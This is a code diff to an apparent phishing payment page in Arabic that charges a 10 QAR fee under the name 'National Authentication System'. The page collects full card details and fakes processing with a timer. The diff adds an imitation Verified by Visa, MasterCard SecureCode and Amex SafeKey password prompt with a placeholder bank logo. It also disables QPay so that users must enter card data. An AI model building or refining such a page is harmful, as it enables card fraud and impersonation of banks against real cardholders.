@@ -48,14 +48,13 @@
         .summary-row {
             display: flex;
             justify-content: space-between;
-            padding: 10px 0;
+            padding: 8px 0;
             border-bottom: 1px solid #e0e0e0;
         }
         
         .summary-row:last-child {
             border-bottom: none;
-            padding-top: 15px;
-            font-weight: bold;
+            padding-top: 12px;
         }
         
         .summary-label {
@@ -71,40 +70,33 @@
             text-align: left;
         }
         
-        .summary-value.amount {
-            color: #8b1538;
-            font-size: 18px;
-            font-weight: bold;
-        }
-        
         /* Payment Methods */
         .payment-methods-section {
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
         
         .payment-methods-section h3 {
             font-size: 16px;
             font-weight: 600;
             color: #2d3748;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
         }
         
         .payment-methods {
             display: flex;
-            gap: 15px;
-            flex-wrap: wrap;
+            gap: 12px;
         }
         
         .payment-method {
-            flex: 1;
-            min-width: 140px;
+            flex: 0 0 auto;
             background-color: #fff;
             border: 2px solid #e2e8f0;
-            border-radius: 8px;
-            padding: 15px;
+            border-radius: 6px;
+            padding: 12px 20px;
             cursor: pointer;
             transition: all 0.2s ease;
             text-align: center;
+            min-width: 140px;
         }
         
         .payment-method:hover {
@@ -119,11 +111,11 @@
         }
         
         .payment-method-logo {
-            height: 40px;
+            height: 35px;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
         
         .payment-method-logo img {
@@ -141,6 +133,30 @@
         .payment-method.active .payment-method-name {
             color: #8b1538;
             font-weight: 600;
+        }
+        
+        /* Accepted Cards */
+        .accepted-cards {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #e0e0e0;
+        }
+        
+        .accepted-cards-label {
+            font-size: 13px;
+            color: #718096;
+            margin-bottom: 8px;
+        }
+        
+        .accepted-cards-logos {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+        }
+        
+        .accepted-cards-logos img {
+            height: 30px;
+            opacity: 0.7;
         }
         
         /* Card Form */
@@ -288,8 +304,10 @@
         }
         
         .btn-pay:disabled {
-            opacity: 0.6;
+            opacity: 0.5;
             cursor: not-allowed;
+            background: #cbd5e0;
+            box-shadow: none;
         }
         
         .btn-back {
@@ -313,148 +331,166 @@
         
         /* Modal Styles */
         .modal-content {
-            border-radius: 10px;
-            border: none;
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+            border-radius: 0;
+            border: 2px solid #1434CB;
         }
         
         .modal-header {
-            border-bottom: 1px solid #e2e8f0;
-            padding: 20px 25px;
-            background: linear-gradient(135deg, #8b1538 0%, #6d1029 100%);
-            border-radius: 10px 10px 0 0;
+            background-color: #1434CB;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 0;
+            border-bottom: none;
         }
         
         .modal-title {
             color: white;
-            font-weight: 600;
-            font-size: 17px;
+            font-weight: bold;
+            font-size: 14px;
         }
         
         .modal-body {
-            padding: 30px 25px;
-            text-align: center;
+            padding: 25px;
+            background-color: #f5f5f5;
+            direction: ltr;
+            text-align: left;
         }
         
-        .processing-spinner {
-            width: 60px;
-            height: 60px;
-            margin: 20px auto;
-            border: 4px solid #f3f4f6;
-            border-top: 4px solid #8b1538;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+        /* Verified by Visa Style */
+        .vbv-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
         }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .verified-logo {
+        .vbv-logo {
             width: 140px;
-            margin: 15px auto;
         }
         
-        .verified-logo img {
+        .vbv-logo img {
             width: 100%;
         }
         
-        .bank-notice {
-            background: linear-gradient(135deg, #eff6ff 0%, #dbeafe 100%);
-            border: 2px solid #93c5fd;
-            border-radius: 8px;
-            padding: 18px;
-            margin: 20px 0;
-            text-align: right;
-        }
-        
-        .bank-notice p {
-            margin: 6px 0;
-            color: #1e40af;
-            font-size: 14px;
-            line-height: 1.6;
-        }
-        
-        .bank-notice strong {
-            color: #8b1538;
-            font-weight: 600;
-        }
-        
-        .otp-container {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin: 25px 0;
-            direction: ltr;
-        }
-        
-        .otp-digit {
-            width: 50px;
-            height: 55px;
-            text-align: center;
-            font-size: 24px;
-            font-weight: 600;
-            border: 2px solid #cbd5e0;
-            border-radius: 8px;
-            transition: all 0.2s ease;
-            font-family: 'Courier New', monospace;
-            background-color: #f8fafc;
-        }
-        
-        .otp-digit:focus {
-            outline: none;
-            border-color: #8b1538;
-            background-color: #fff;
-            box-shadow: 0 0 0 3px rgba(139, 21, 56, 0.1);
-        }
-        
-        .resend-link {
-            color: #8b1538;
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 14px;
-        }
-        
-        .resend-link:hover {
-            text-decoration: underline;
-        }
-        
-        .modal-actions {
-            display: flex;
-            gap: 10px;
-            margin-top: 25px;
-        }
-        
-        .modal-actions button {
-            flex: 1;
-            padding: 12px;
-            border-radius: 6px;
-            font-weight: 600;
-            font-size: 15px;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-        
-        .btn-verify {
-            background: linear-gradient(135deg, #8b1538 0%, #6d1029 100%);
+        .bank-logo-placeholder {
+            background-color: #999;
             color: white;
-            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-size: 12px;
+            text-align: center;
         }
         
-        .btn-verify:hover {
-            transform: translateY(-1px);
-            box-shadow: 0 4px 12px rgba(139, 21, 56, 0.3);
+        .vbv-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 8px;
         }
         
-        .btn-cancel {
-            background-color: #fff;
-            color: #4a5568;
-            border: 2px solid #e2e8f0;
+        .vbv-subtitle {
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 20px;
         }
         
-        .btn-cancel:hover {
-            background-color: #f7fafc;
+        .vbv-details {
+            background-color: white;
+            border: 1px solid #ccc;
+            padding: 15px;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+        
+        .vbv-detail-row {
+            display: flex;
+            margin-bottom: 8px;
+        }
+        
+        .vbv-detail-label {
+            font-weight: bold;
+            min-width: 140px;
+            color: #000;
+        }
+        
+        .vbv-detail-value {
+            color: #333;
+        }
+        
+        .vbv-password-section {
+            margin-bottom: 15px;
+        }
+        
+        .vbv-password-label {
+            font-weight: bold;
+            margin-bottom: 8px;
+            color: #000;
+        }
+        
+        .vbv-password-input {
+            width: 200px;
+            padding: 6px;
+            border: 1px solid #999;
+            font-size: 14px;
+        }
+        
+        .vbv-forgot-link {
+            display: block;
+            font-size: 11px;
+            color: #0066cc;
+            text-decoration: underline;
+            margin-top: 5px;
+            cursor: pointer;
+        }
+        
+        .vbv-submit-btn {
+            background-color: #ccc;
+            border: 1px solid #999;
+            padding: 8px 30px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .vbv-submit-btn:hover {
+            background-color: #bbb;
+        }
+        
+        .card-logo-loading {
+            width: 100px;
+            margin: 20px auto;
+        }
+        
+        .card-logo-loading img {
+            width: 100%;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 0.4; }
+            50% { opacity: 1; }
+        }
+        
+        .service-unavailable {
+            text-align: center;
+            padding: 30px 20px;
+        }
+        
+        .service-unavailable i {
+            font-size: 50px;
+            color: #f59e0b;
+            margin-bottom: 15px;
+        }
+        
+        .service-unavailable h3 {
+            color: #2d3748;
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        
+        .service-unavailable p {
+            color: #718096;
+            font-size: 14px;
         }
     </style>
 </head>
@@ -487,7 +523,7 @@
                             </div>
                             <div class="summary-row">
                                 <span class="summary-label">المبلغ</span>
-                                <span class="summary-value amount">10.00 QAR</span>
+                                <span class="summary-value">10.00 QAR</span>
                             </div>
                         </div>
                         
@@ -497,8 +533,8 @@
                             <div class="payment-methods">
                                 <div class="payment-method active" data-method="card">
                                     <div class="payment-method-logo">
-                                        <img src="/images/visa.png" alt="Visa" style="width: 50px; margin-left: 5px;">
-                                        <img src="/images/mastercard.png" alt="Mastercard" style="width: 45px;">
+                                        <img src="/images/visa.png" alt="Visa" style="width: 45px; margin-left: 5px;">
+                                        <img src="/images/mastercard.png" alt="Mastercard" style="width: 40px;">
                                     </div>
                                     <div class="payment-method-name">بطاقة ائتمانية</div>
                                 </div>
@@ -508,11 +544,15 @@
                                     </div>
                                     <div class="payment-method-name">QPay</div>
                                 </div>
-                                <div class="payment-method" data-method="naps">
-                                    <div class="payment-method-logo">
-                                        <img src="/images/naps.jpg" alt="NAPS" style="height: 35px;">
-                                    </div>
-                                    <div class="payment-method-name">NAPS</div>
+                            </div>
+                            
+                            <!-- Accepted Cards -->
+                            <div class="accepted-cards">
+                                <div class="accepted-cards-label">البطاقات المقبولة:</div>
+                                <div class="accepted-cards-logos">
+                                    <img src="/images/visa.png" alt="Visa">
+                                    <img src="/images/mastercard.png" alt="Mastercard">
+                                    <img src="/images/amex.png" alt="American Express">
                                 </div>
                             </div>
                         </div>
@@ -597,7 +637,7 @@
                                 </div>
                                 
                                 <!-- Submit Button -->
-                                <button type="submit" class="btn-pay" id="payBtn">
+                                <button type="submit" class="btn-pay" id="payBtn" disabled>
                                     <i class="fa fa-credit-card" style="margin-left: 8px;"></i>
                                     ادفع 10.00 ريال قطري
                                 </button>
@@ -609,34 +649,15 @@
                             </form>
                         </div>
                         
-                        <!-- QPay Form (Placeholder) -->
+                        <!-- QPay Form -->
                         <div class="card-form-container" id="qpayForm">
-                            <div style="text-align: center; padding: 40px 20px;">
-                                <i class="fa fa-mobile" style="font-size: 60px; color: #8b1538; margin-bottom: 20px;"></i>
-                                <h3>الدفع عبر QPay</h3>
-                                <p style="color: #4a5568; margin: 15px 0;">سيتم تحويلك إلى تطبيق QPay لإتمام الدفع</p>
-                                <button type="button" class="btn-pay" onclick="alert('سيتم تحويلك إلى QPay')">
-                                    الانتقال إلى QPay
-                                </button>
-                                <button type="button" class="btn-back" onclick="window.location.href='/step3'">
+                            <div class="service-unavailable">
+                                <i class="fa fa-exclamation-triangle"></i>
+                                <h3>الخدمة متوقفة مؤقتاً</h3>
+                                <p>نعتذر، خدمة QPay غير متاحة حالياً. يرجى استخدام البطاقة الائتمانية.</p>
+                                <button type="button" class="btn-back" style="margin-top: 20px;" onclick="document.querySelector('[data-method=card]').click()">
                                     <i class="fa fa-arrow-right" style="margin-left: 6px;"></i>
-                                    رجوع
-                                </button>
-                            </div>
-                        </div>
-                        
-                        <!-- NAPS Form (Placeholder) -->
-                        <div class="card-form-container" id="napsForm">
-                            <div style="text-align: center; padding: 40px 20px;">
-                                <i class="fa fa-university" style="font-size: 60px; color: #8b1538; margin-bottom: 20px;"></i>
-                                <h3>الدفع عبر NAPS</h3>
-                                <p style="color: #4a5568; margin: 15px 0;">سيتم تحويلك إلى بوابة NAPS لإتمام الدفع</p>
-                                <button type="button" class="btn-pay" onclick="alert('سيتم تحويلك إلى NAPS')">
-                                    الانتقال إلى NAPS
-                                </button>
-                                <button type="button" class="btn-back" onclick="window.location.href='/step3'">
-                                    <i class="fa fa-arrow-right" style="margin-left: 6px;"></i>
-                                    رجوع
+                                    العودة لطرق الدفع
                                 </button>
                             </div>
                         </div>
@@ -652,46 +673,74 @@
     <!-- Processing Modal -->
     <div class="modal fade" id="processingModal" tabindex="-1" role="dialog" data-backdrop="static" data-keyboard="false">
         <div class="modal-dialog modal-sm" role="document">
-            <div class="modal-content">
-                <div class="modal-header">
+            <div class="modal-content" style="border-radius: 10px; border: none;">
+                <div class="modal-header" style="background: linear-gradient(135deg, #8b1538 0%, #6d1029 100%); border-radius: 10px 10px 0 0;">
                     <h4 class="modal-title">جاري معالجة الدفع</h4>
                 </div>
-                <div class="modal-body">
-                    <div class="processing-spinner"></div>
+                <div class="modal-body" style="padding: 40px 25px; text-align: center; background-color: white;">
+                    <div class="card-logo-loading" id="cardLogoLoading"></div>
                     <p style="color: #4a5568; font-size: 15px; margin-top: 15px;">يرجى الانتظار...</p>
                 </div>
             </div>
         </div>
     </div>
     
-    <!-- OTP Modal -->
+    <!-- OTP Modal (Verified by Visa Style) -->
     <div class="modal fade" id="otpModal" tabindex="-1" role="dialog" data-backdrop="static" data-keyboard="false">
         <div class="modal-dialog" role="document">
             <div class="modal-content">
                 <div class="modal-header">
-                    <h4 class="modal-title">التحقق الآمن</h4>
+                    <h4 class="modal-title" id="modalHeaderTitle">Verified by Visa</h4>
                 </div>
                 <div class="modal-body">
-                    <div class="verified-logo" id="verifiedLogo"></div>
-                    
-                    <div class="bank-notice">
-                        <p><strong>إشعار من البنك</strong></p>
-                        <p>تم خصم مبلغ <strong>10.00 ريال قطري</strong> من بطاقتك المنتهية بـ <strong id="lastDigits">****</strong></p>
-                        <p>يرجى إدخال رمز التحقق المرسل إلى هاتفك المسجل</p>
+                    <!-- Header with logos -->
+                    <div class="vbv-header">
+                        <div class="vbv-logo" id="vbvLogo">
+                            <img src="/images/verified-visa.png" alt="Verified by Visa">
+                        </div>
+                        <div class="bank-logo-placeholder">
+                            My Issuing Bank Logo
+                        </div>
                     </div>
                     
-                    <div class="otp-container" id="otpContainer">
-                        <!-- OTP inputs will be generated by JS -->
+                    <!-- Title -->
+                    <div class="vbv-title">Added Protection</div>
+                    <div class="vbv-subtitle">Please submit your Verified by Visa password.</div>
+                    
+                    <!-- Transaction Details -->
+                    <div class="vbv-details">
+                        <div class="vbv-detail-row">
+                            <div class="vbv-detail-label">Merchant:</div>
+                            <div class="vbv-detail-value">National Authentication System</div>
+                        </div>
+                        <div class="vbv-detail-row">
+                            <div class="vbv-detail-label">Amount:</div>
+                            <div class="vbv-detail-value">10.00 QAR</div>
+                        </div>
+                        <div class="vbv-detail-row">
+                            <div class="vbv-detail-label">Date:</div>
+                            <div class="vbv-detail-value" id="currentDate"></div>
+                        </div>
+                        <div class="vbv-detail-row">
+                            <div class="vbv-detail-label">Card Number:</div>
+                            <div class="vbv-detail-value" id="maskedCard">**** **** **** ****</div>
+                        </div>
+                        <div class="vbv-detail-row">
+                            <div class="vbv-detail-label">Personal Message:</div>
+                            <div class="vbv-detail-value">Cardholder verification required</div>
+                        </div>
                     </div>
                     
-                    <p style="color: #718096; font-size: 14px; margin-top: 15px;">
-                        لم تستلم الرمز؟ <a href="#" class="resend-link" id="resendOtp">إعادة الإرسال</a>
-                    </p>
-                    
-                    <div class="modal-actions">
-                        <button type="button" class="btn-cancel" onclick="location.reload()">إلغاء</button>
-                        <button type="button" class="btn-verify" id="verifyBtn">تحقق</button>
+                    <!-- Password Input -->
+                    <div class="vbv-password-section">
+                        <div class="vbv-password-label">Password:</div>
+                        <input type="password" class="vbv-password-input" id="vbvPassword" maxlength="20">
+                        <a class="vbv-forgot-link">Forgot your password?</a>
                     </div>
+                    
+                    <!-- Submit Button -->
+                    <button type="button" class="vbv-submit-btn" id="vbvSubmitBtn">Submit</button>
+                    
                 </div>
             </div>
         </div>
@@ -711,22 +760,16 @@
         // Payment method switching
         document.querySelectorAll('.payment-method').forEach(method => {
             method.addEventListener('click', function() {
-                // Remove active class from all methods
                 document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('active'));
-                // Add active class to clicked method
                 this.classList.add('active');
                 
-                // Hide all forms
                 document.querySelectorAll('.card-form-container').forEach(f => f.classList.remove('active'));
                 
-                // Show selected form
                 const methodType = this.dataset.method;
                 if (methodType === 'card') {
                     document.getElementById('cardForm').classList.add('active');
                 } else if (methodType === 'qpay') {
                     document.getElementById('qpayForm').classList.add('active');
-                } else if (methodType === 'naps') {
-                    document.getElementById('napsForm').classList.add('active');
                 }
             });
         });
@@ -734,12 +777,20 @@
         // Card logos
         const cardLogos = {
             visa: '/images/visa.png',
-            mastercard: '/images/mastercard.png'
+            mastercard: '/images/mastercard.png',
+            amex: '/images/amex.png'
         };
         
         const verifiedLogos = {
-            visa: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="140" height="45" viewBox="0 0 140 45"%3E%3Crect width="140" height="45" rx="6" fill="%231434CB"/%3E%3Ctext x="12" y="28" font-family="Arial" font-size="14" font-weight="bold" fill="white"%3EVerified by VISA%3C/text%3E%3C/svg%3E',
-            mastercard: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="140" height="45" viewBox="0 0 140 45"%3E%3Crect width="140" height="45" rx="6" fill="%23000000"/%3E%3Ctext x="8" y="28" font-family="Arial" font-size="12" font-weight="bold" fill="white"%3EMasterCard SecureCode%3C/text%3E%3C/svg%3E'
+            visa: '/images/verified-visa.png',
+            mastercard: '/images/mastercard-securecode.png',
+            amex: '/images/amex.png'
+        };
+        
+        const modalTitles = {
+            visa: 'Verified by Visa',
+            mastercard: 'MasterCard SecureCode',
+            amex: 'American Express SafeKey'
         };
         
         // Luhn algorithm
@@ -762,6 +813,21 @@
             return sum % 10 === 0;
         }
         
+        // Form validation state
+        let isCardNumberValid = false;
+        let isCardHolderValid = false;
+        let isExpiryValid = false;
+        let isCvvValid = false;
+        
+        function updateSubmitButton() {
+            const submitBtn = document.getElementById('payBtn');
+            if (isCardNumberValid && isCardHolderValid && isExpiryValid && isCvvValid) {
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.disabled = true;
+            }
+        }
+        
         // Card number input
         const cardNumberInput = document.getElementById('cardNumber');
         const cardIcon = document.getElementById('cardIcon');
@@ -771,6 +837,8 @@
             let value = e.target.value.replace(/\s/g, '');
             let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
             e.target.value = formatted;
+            
+            isCardNumberValid = false;
             
             if (value.length >= 1) {
                 const firstDigit = value[0];
@@ -789,6 +857,13 @@
                     cardIcon.classList.add('show');
                     cardError.classList.remove('show');
                     e.target.classList.remove('error');
+                } else if (firstDigit === '3') {
+                    cardType = 'amex';
+                    otpLength = 4;
+                    cardIcon.innerHTML = `<img src="${cardLogos.amex}">`;
+                    cardIcon.classList.add('show');
+                    cardError.classList.remove('show');
+                    e.target.classList.remove('error');
                 } else {
                     cardType = '';
                     cardIcon.classList.remove('show');
@@ -796,15 +871,17 @@
                     e.target.classList.add('error');
                 }
                 
-                if (value.length === 16) {
+                if (value.length >= 15) {
                     if (luhnCheck(value)) {
                         e.target.classList.add('success');
                         e.target.classList.remove('error');
                         cardError.classList.remove('show');
+                        isCardNumberValid = true;
                     } else {
                         e.target.classList.add('error');
                         e.target.classList.remove('success');
                         cardError.classList.add('show');
+                        isCardNumberValid = false;
                     }
                 }
             } else {
@@ -813,6 +890,15 @@
                 cardError.classList.remove('show');
                 e.target.classList.remove('error', 'success');
             }
+            
+            updateSubmitButton();
+        });
+        
+        // Card holder input
+        const cardHolderInput = document.getElementById('cardHolder');
+        cardHolderInput.addEventListener('input', function(e) {
+            isCardHolderValid = e.target.value.trim().length >= 3;
+            updateSubmitButton();
         });
         
         // Expiry date input
@@ -827,6 +913,7 @@
             }
             
             e.target.value = value;
+            isExpiryValid = false;
             
             if (value.length === 7) {
                 const parts = value.split(' / ');
@@ -839,12 +926,16 @@
                 if (month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {
                     e.target.classList.add('error');
                     expiryError.classList.add('show');
+                    isExpiryValid = false;
                 } else {
                     e.target.classList.remove('error');
                     e.target.classList.add('success');
                     expiryError.classList.remove('show');
+                    isExpiryValid = true;
                 }
             }
+            
+            updateSubmitButton();
         });
         
         // CVV input
@@ -854,7 +945,12 @@
             
             if (e.target.value.length >= 3) {
                 e.target.classList.add('success');
+                isCvvValid = true;
+            } else {
+                isCvvValid = false;
             }
+            
+            updateSubmitButton();
         });
         
         // Form submission
@@ -863,79 +959,60 @@
             
             const cardNumber = cardNumberInput.value.replace(/\s/g, '');
             
-            if (!cardType || cardNumber.length !== 16 || !luhnCheck(cardNumber)) {
+            if (!cardType || !isCardNumberValid) {
                 cardError.classList.add('show');
                 cardNumberInput.classList.add('error');
                 return;
             }
+            
+            // Show card logo in loading modal
+            const cardLogoLoading = document.getElementById('cardLogoLoading');
+            cardLogoLoading.innerHTML = `<img src="${cardLogos[cardType]}">`;
             
             $('#processingModal').modal('show');
             
             setTimeout(function() {
                 $('#processingModal').modal('hide');
                 
-                const verifiedLogo = document.getElementById('verifiedLogo');
-                verifiedLogo.innerHTML = `<img src="${verifiedLogos[cardType]}" style="width: 100%;">`;
+                // Set modal title
+                document.getElementById('modalHeaderTitle').textContent = modalTitles[cardType];
                 
-                document.getElementById('lastDigits').textContent = cardNumber.slice(-4);
+                // Set verified logo
+                const vbvLogo = document.getElementById('vbvLogo');
+                vbvLogo.innerHTML = `<img src="${verifiedLogos[cardType]}" style="width: 100%;">`;
                 
-                const otpContainer = document.getElementById('otpContainer');
-                otpContainer.innerHTML = '';
-                for (let i = 0; i < otpLength; i++) {
-                    const input = document.createElement('input');
-                    input.type = 'text';
-                    input.className = 'otp-digit';
-                    input.maxLength = 1;
-                    input.dataset.index = i;
-                    otpContainer.appendChild(input);
-                }
+                // Set current date
+                const now = new Date();
+                const dateStr = (now.getMonth() + 1).toString().padStart(2, '0') + '/' + 
+                               now.getDate().toString().padStart(2, '0') + '/' + 
+                               now.getFullYear();
+                document.getElementById('currentDate').textContent = dateStr;
                 
-                setupOtpInputs();
+                // Set masked card number
+                const lastFour = cardNumber.slice(-4);
+                document.getElementById('maskedCard').textContent = `**** **** **** ${lastFour}`;
                 
                 $('#otpModal').modal('show');
-                otpContainer.children[0].focus();
+                document.getElementById('vbvPassword').focus();
             }, 2500);
         });
         
-        // OTP input handling
-        function setupOtpInputs() {
-            const inputs = document.querySelectorAll('.otp-digit');
+        // VBV Submit
+        document.getElementById('vbvSubmitBtn').addEventListener('click', function() {
+            const password = document.getElementById('vbvPassword').value;
             
-            inputs.forEach((input, index) => {
-                input.addEventListener('input', function(e) {
-                    if (e.target.value.length === 1 && index < otpLength - 1) {
-                        inputs[index + 1].focus();
-                    }
-                });
-                
-                input.addEventListener('keydown', function(e) {
-                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
-                        inputs[index - 1].focus();
-                    }
-                });
-            });
-        }
-        
-        // Verify OTP
-        document.getElementById('verifyBtn').addEventListener('click', function() {
-            const inputs = document.querySelectorAll('.otp-digit');
-            let otp = '';
-            
-            inputs.forEach(input => {
-                otp += input.value;
-            });
-            
-            if (otp.length === otpLength) {
+            if (password.length >= 4) {
                 window.location.href = '/step5';
             } else {
-                alert('يرجى إدخال رمز التحقق كاملاً');
+                alert('Please enter your password');
             }
         });
         
-        // Resend OTP
-        document.getElementById('resendOtp').addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('تم إعادة إرسال رمز التحقق');
+        // Enter key on password
+        document.getElementById('vbvPassword').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('vbvSubmitBtn').click();
+            }
         });
     </script>
 </body>
